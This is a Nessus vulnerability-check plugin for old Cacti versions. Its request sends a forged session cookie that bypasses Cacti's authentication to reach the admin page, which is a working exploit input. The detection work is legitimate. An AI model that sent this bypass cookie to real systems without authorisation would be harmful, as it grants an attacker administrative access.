#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(18619);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-2148", "CVE-2005-2149");
  script_bugtraq_id(14128, 14129, 14130);
  script_xref(name:"OSVDB", value:"17719");
  script_xref(name:"OSVDB", value:"17721");

  script_name(english: "Cacti < 0.8.6f Multiple Vulnerabilities (Priv Esc, Cmd Exe)");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Cacti, a web-based frontend to RRDTool for
network graphing. 

The version of Cacti on the remote host suffers from several
vulnerabilities that may allow an attacker to bypass authentication
and gain administrative access to the affected application (if PHP's
'register_globals' setting is enabled), execute arbitrary commands
remotely, and conduct SQL injection attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory-032005.php" );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory-042005.php" );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory-052005.php" );
 script_set_attribute(attribute:"see_also", value:"http://www.cacti.net/release_notes_0_8_6f.php" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Cacti 0.8.6f or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

  script_summary(english: "Checks for multiple vulnerabilities in Cacti < 0.8.6f");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

disable_cookiejar();
# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the authentication bypass flaw.
  r = http_send_recv3(port: port, method: 'GET', 
    item: strcat(dir, "/user_admin.php"), 
    add_headers: make_array("Cookie", "_SESSION[sess_user_id]=1;no_http_headers=1;"));
  if (isnull(r)) exit(0);

  # There's a problem if we get a link for adding users.
  if ('href="user_admin.php?action=user_edit">Add' >< r[2]) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
